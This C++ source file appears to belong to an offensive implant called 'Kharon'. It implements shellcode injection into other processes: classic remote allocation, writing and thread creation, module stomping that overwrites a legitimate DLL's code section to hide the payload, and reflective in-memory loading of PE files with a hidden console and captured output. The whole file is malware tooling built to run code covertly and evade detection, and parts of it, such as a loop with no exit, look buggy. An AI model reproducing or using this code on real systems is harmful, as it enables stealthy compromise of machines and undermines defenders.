#include <Kharon.h>

auto DECLFN Injection::Shellcode(
    _In_ ULONG ProcessID,
    _In_ BYTE* Buffer,
    _In_ UPTR  Size,
    _In_ PVOID Param
) -> BOOL {
    BOOL  Success = FALSE;

    switch ( this->Ctx.Sc.TechniqueID ) {
        case ScClassic: {
            PVOID  ScBase   = NULL;
            ULONG  TdID     = 0;
            HANDLE TdHandle = INVALID_HANDLE_VALUE;

            Success = this->Classic( 
                ProcessID, Buffer, Size, Param, &ScBase
            );

            if ( !Success ) return Success;
        }
        case ScStomp: {

        }
    }

    return Success;
}

auto DECLFN Injection::Classic(
    _In_  ULONG   ProcessID,
    _In_  BYTE*   Buffer,
    _In_  UPTR    Size,
    _In_  PVOID   Param,
    _Out_ PVOID*  Base
) -> BOOL {
    BOOL   Success    = FALSE;
    HANDLE PsHandle   = INVALID_HANDLE_VALUE; 
    HANDLE PipeHandle = INVALID_HANDLE_VALUE;
    PVOID  TmpMem     = NULL;
    PVOID  BaseRet    = NULL;
    ULONG  OldProt    = 0;
    ULONG  BytesRead  = 0;
    ULONG  FullSize   = 0;

    if ( ProcessID != 0 ) {
        PsHandle = Self->Ps->Open( PROCESS_ALL_ACCESS, FALSE, ProcessID );
    }

    BaseRet = Self->Mm->Alloc( nullptr, Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, PsHandle );

    if ( PsHandle != INVALID_HANDLE_VALUE ) {
        Success = Self->Mm->Write( BaseRet, Buffer, Size, PsHandle );
        if ( !Success ) goto _KH_END;
    } else {
        Mem::Copy( BaseRet, Buffer, Size );
    }

    Success = Self->Mm->Protect( BaseRet, Size, PAGE_EXECUTE_READ, &OldProt, PsHandle );
    if ( !Success ) goto _KH_END;

    Self->Td->Create( PsHandle, BaseRet, Param, 0, 0, 0 );
_KH_END:
    if ( !Success && BaseRet ) {
        Self->Mm->Free( BaseRet, Size, MEM_RELEASE, PsHandle );
    } else {
        *Base = BaseRet;
    }

    return Success;
}

/*
 * @brief
 * module stomp technique to shellcode injection
 * 
 */
auto DECLFN Injection::Stomp(
    _In_  ULONG   ProcessID,
    _In_  BYTE*   Buffer,
    _In_  UPTR    Size,
    _In_  PVOID   Param,
    _Out_ PVOID*  Base
) -> BOOL {
    HMODULE Modules[1024];

    LONG    NtStatus   = STATUS_UNSUCCESSFUL;
    PVOID   LibPtr     = nullptr;
    PCHAR   LibName    = nullptr;
    PVOID   FileBuff   = nullptr;
    BOOL    Found      = FALSE;
    ULONG   Needed     = 0;
    ULONG   ThreadID   = 0;
    ULONG   TextVirt   = 0;
    ULONG   TextSize   = 0;
    ULONG   FileSize   = 0;
    SIZE_T  ViewSize   = 0;
    ULONG   OldProt    = 0;
    ULONG   Entrypoint = 0;
    HANDLE  TdHandle   = INVALID_HANDLE_VALUE;
    HANDLE  PsHandle   = INVALID_HANDLE_VALUE;
    HANDLE  SecHandle  = INVALID_HANDLE_VALUE;
    HANDLE  Transacted = INVALID_HANDLE_VALUE;
    HANDLE  FileHandle = INVALID_HANDLE_VALUE;

    PIMAGE_NT_HEADERS       Header = { 0 };
    PIMAGE_SECTION_HEADER   SecHdr = { 0 };

    // 
    // open handle to the target process
    //
    PsHandle = Self->Ps->Open( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, ProcessID );
    if ( PsHandle == INVALID_HANDLE_VALUE ) return FALSE;

    // 
    // get random library if not loaded in the process
    // 
    do {
        LibName = Self->Lib->GetRnd();

        if ( Self->Krnl32.EnumProcessModules( PsHandle, Modules, sizeof( Modules ), &Needed ) ) {
            for ( INT i = 0; i < ( Needed / sizeof( HMODULE ) ); i++ ) {
                CHAR ModName[MAX_PATH] = { 0 };

                Self->Krnl32.K32GetModuleFileNameExA( 
                    PsHandle, Modules[i], ModName, ( sizeof( ModName ) / sizeof( CHAR ) ) 
                );
                
                if ( Str::CompareA( ModName, LibName ) == 0 ) Found = TRUE;
            }
        }

        if ( Found ) continue;

        FileHandle = Self->Krnl32.CreateFileA( LibName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
        if ( FileHandle == INVALID_HANDLE_VALUE ) return FALSE;

        FileSize = Self->Krnl32.GetFileSize( FileHandle, 0 );
        if ( !FileSize ) return FALSE;

        FileBuff = Self->Hp->Alloc( FileSize );

        Self->Krnl32.ReadFile( FileHandle, FileBuff, FileSize, 0, 0 );

        Header = (PIMAGE_NT_HEADERS)( U_PTR( FileBuff ) + static_cast<PIMAGE_DOS_HEADER>( FileBuff )->e_lfanew );
        SecHdr = IMAGE_FIRST_SECTION( Header );

        Entrypoint = Header->OptionalHeader.AddressOfEntryPoint;

        for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
            CHAR SecName[8] = { 0 };

            Mem::Copy( SecName, SecHdr[i].Name, 8 );

            if ( Hsh::Str( SecName ) == Hsh::Str( ".text" ) ) {
                if ( SecHdr[i].SizeOfRawData >= Size ) {
                    TextVirt = SecHdr[i].VirtualAddress;
                    TextSize = SecHdr[i].SizeOfRawData;
                }
            }
        }

    } while ( 1 );

    KhDbg( "Module selected to stomping: %s", LibName );

    NtStatus = Self->Mm->CreateSection( &SecHandle, SECTION_ALL_ACCESS, nullptr, 0, PAGE_READONLY, SEC_IMAGE, FileHandle );
    if ( NtStatus != STATUS_SUCCESS ) return FALSE;

    NtStatus = Self->Mm->MapView( SecHandle, NtCurrentProcess(), &LibPtr, 0, 0, 0, &ViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE );
    if ( NtStatus != STATUS_SUCCESS ) return FALSE;

    if ( !Self->Mm->Protect( (PVOID)( U_PTR( LibPtr ) + TextVirt ), TextSize, PAGE_READWRITE, &OldProt, PsHandle ) ) return FALSE;
    
    Mem::Copy( (PVOID)( U_PTR( LibPtr ) + TextVirt ), Buffer, Size );

    TdHandle = Self->Td->Create( PsHandle, (PVOID)( U_PTR( LibPtr ) + TextVirt ), Param, 0, 0, &ThreadID );

    KhDbg( "thread Created with PID: %d", ThreadID );

    return TRUE;
}

auto DECLFN Injection::Reflection(
    _In_ BYTE*  Buffer,
    _In_ ULONG  Size,
    _In_ PVOID  Param
) -> BOOL {
    BYTE*  ImgBase = NULL;
    ULONG  ImgSize = 0;
    UPTR   Delta   = 0;
    BOOL   IsDll   = FALSE;
    PWCH*  Argv    = NULL;
    INT    Argc    = 0;

    ULONG* Reads     = { 0 };
    HWND   WinHandle = NULL;
    HANDLE BackupOut = INVALID_HANDLE_VALUE;
    HANDLE PipeRead  = INVALID_HANDLE_VALUE;
    HANDLE PipeWrite = INVALID_HANDLE_VALUE;

    SECURITY_ATTRIBUTES SecAttr = { 0 };

    PIMAGE_NT_HEADERS     Header = { 0 };
    PIMAGE_SECTION_HEADER SecHdr = { 0 };
    PIMAGE_DATA_DIRECTORY RelDir = { 0 };
    PIMAGE_DATA_DIRECTORY ExpDir = { 0 };
    PIMAGE_DATA_DIRECTORY TlsDir = { 0 };
    PIMAGE_DATA_DIRECTORY ImpDir = { 0 };

    Header = (PIMAGE_NT_HEADERS)( U_PTR( Buffer ) + ( (PIMAGE_DOS_HEADER)( Buffer ) )->e_lfanew );
    SecHdr = IMAGE_FIRST_SECTION( Header );
    RelDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    ExpDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    TlsDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    ImpDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    
    ImgSize = Header->OptionalHeader.SizeOfImage;
    IsDll   = Header->FileHeader.Characteristics & IMAGE_FILE_DLL;

    KhDbg( "parsed pe" );
    KhDbg( "is %s", IsDll ? "DLL" : "EXE" );

    ImgBase = (BYTE*)Self->Mm->Alloc( nullptr, ImgSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    Delta   = U_PTR( ImgBase ) - Header->OptionalHeader.ImageBase;

    KhDbg( "allocated to %p [%d bytes]", ImgBase, Size );

    for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
        Mem::Copy(
            C_PTR( U_PTR( ImgBase)  + SecHdr[i].VirtualAddress ),
            C_PTR( U_PTR( Buffer )  + SecHdr[i].PointerToRawData ),
            SecHdr[i].SizeOfRawData
        );
    }

    KhDbg( "sections copied" );

    Self->Usf->FixImp( ImgBase, ImpDir );
    KhDbg( "sections copied" );
    Self->Usf->FixRel( ImgBase, Delta, RelDir );
    KhDbg( "sections copied" );
    Self->Usf->FixExp( ImgBase, ExpDir );
    KhDbg( "sections copied" );
    // Self->Usf->FixTls( ImgBase, TlsDir );

    KhDbg( "fixed imports, exceptions and relocations" );

    for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
        PVOID    SectionPtr       = ( ImgBase + SecHdr[i].VirtualAddress );
        SIZE_T   SectionSize      = SecHdr[i].SizeOfRawData;
        ULONG    MemoryProtection = 0;
        ULONG    OldProtection    = 0;
		
		if ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE )
			MemoryProtection = PAGE_WRITECOPY;

		if ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ )
			MemoryProtection = PAGE_READONLY;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			MemoryProtection = PAGE_READWRITE;

		if ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE )
			MemoryProtection = PAGE_EXECUTE;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) )
			MemoryProtection = PAGE_EXECUTE_WRITECOPY;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			MemoryProtection = PAGE_EXECUTE_READ;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			MemoryProtection = PAGE_EXECUTE_READWRITE;

        if ( !( Self->Mm->Protect( SectionPtr, SectionSize, MemoryProtection, &OldProtection, NtCurrentProcess() ) ) ) { return FALSE; }
    }

    KhDbg( "fixed sections memory protections" );

    SecAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };

    Self->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecAttr, PIPE_BUFFER_LENGTH );

    WinHandle = Self->Krnl32.GetConsoleWindow();

    if ( !WinHandle ) {
        Self->Krnl32.AllocConsole();

        if ( !( WinHandle = Self->Krnl32.GetConsoleWindow() ) ) {
            Self->User32.ShowWindow( WinHandle, SW_HIDE );
        }
    }

    BackupOut = Self->Krnl32.GetStdHandle( STD_OUTPUT_HANDLE );
    Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, PipeWrite );

    if ( IsDll ) {
        BOOL ( *KDllMain )( PVOID, ULONG, PVOID ) = decltype( KDllMain )( ImgBase + Header->OptionalHeader.AddressOfEntryPoint );
        KDllMain( ImgBase, DLL_PROCESS_ATTACH, NULL );
    } else {
        if ( Header->OptionalHeader.Subsystem == 2 ) {
            INT ( *KWinMain )( PVOID, UPTR, PVOID, INT ) = decltype( KWinMain )( ImgBase + Header->OptionalHeader.AddressOfEntryPoint );
            KWinMain( ImgBase, Self->Session.Base.Start, Param, SW_HIDE );
        } else if ( Header->OptionalHeader.Subsystem == 3 ) {
            INT ( *KMain )( INT, PWCH* ) = decltype( KMain )( ImgBase + Header->OptionalHeader.AddressOfEntryPoint );

            if ( Param ) {
                Argv = Self->Shell32.CommandLineToArgvW( W_PTR( Param ), &Argc );
                KMain( Argc, Argv );
            } else {
                KMain( Argc, Argv );
            }
        }
    }

    KhDbg( "reading bytes..." );

    this->Ctx.Pipe.p = Self->Hp->Alloc( PIPE_BUFFER_LENGTH );
    Self->Krnl32.ReadFile( PipeRead, this->Ctx.Pipe.p, PIPE_BUFFER_LENGTH, Reads, 0 );

    KhDbg( "reads %d %p", Reads, this->Ctx.Pipe.p );

_KH_END:
    if ( ImgBase ) {
        Self->Mm->Free( ImgBase, Size, MEM_RELEASE );
    }

    if ( BackupOut ) Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, BackupOut );
}